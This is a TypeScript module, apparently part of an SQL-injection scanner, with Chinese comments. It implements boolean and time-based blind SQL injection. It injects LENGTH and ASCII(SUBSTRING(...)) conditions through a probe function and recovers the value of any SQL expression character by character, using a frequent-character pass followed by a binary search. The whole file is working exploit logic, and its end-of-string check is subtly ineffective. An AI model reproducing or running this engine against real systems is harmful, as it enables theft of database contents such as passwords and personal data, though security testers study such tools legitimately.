/**
 * 盲注引擎 -- 布尔/时间盲注逐字符二分提取
 *
 * probe 函数由调用方（scanner）注入：给定条件 SQL 片段，返回条件是否为真。
 *   - 布尔盲注：条件真 → 响应有差异（true）
 *   - 时间盲注：条件真 → 响应延迟（true）
 *
 * 提取策略：
 *   1. 逐位置确定长度（LENGTH>=N）
 *   2. 每字符先查高频字符集（ASCII=...），未命中再二分 ASCII(32..126)
 */

export interface BlindOptions { maxLen?: number; }

const HIGH_FREQ = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-$@.';

export async function blindExtractBoolean(
  probe: (condSql: string) => Promise<boolean>,
  sqlExpr: string,
  opts: BlindOptions = {},
): Promise<string> {
  return extractByProbe(probe, sqlExpr, opts.maxLen ?? 64);
}

export async function blindExtractTime(
  probe: (condSql: string) => Promise<boolean>,
  sqlExpr: string,
  opts: BlindOptions = {},
): Promise<string> {
  return extractByProbe(probe, sqlExpr, opts.maxLen ?? 64);
}

async function extractByProbe(
  probe: (condSql: string) => Promise<boolean>,
  sqlExpr: string,
  maxLen: number,
): Promise<string> {
  let result = '';
  for (let i = 1; i <= maxLen; i++) {
    const lenOk = await probe(`LENGTH((${sqlExpr}))>=${i}`);
    if (!lenOk) break;
    const ch = await extractChar(probe, sqlExpr, i);
    if (ch === null) break;
    result += ch;
  }
  return result;
}

async function extractChar(
  probe: (condSql: string) => Promise<boolean>,
  sqlExpr: string,
  pos: number,
): Promise<string | null> {
  for (const c of HIGH_FREQ) {
    if (await probe(`ASCII(SUBSTRING((${sqlExpr}),${pos},1))=ASCII('${c}')`)) return c;
  }
  let lo = 32;
  let hi = 126;
  while (lo < hi) {
    const mid = Math.ceil((lo + hi) / 2);
    if (await probe(`ASCII(SUBSTRING((${sqlExpr}),${pos},1))>=${mid}`)) lo = mid;
    else hi = mid - 1;
  }
  return lo === 0 ? null : String.fromCharCode(lo);
}
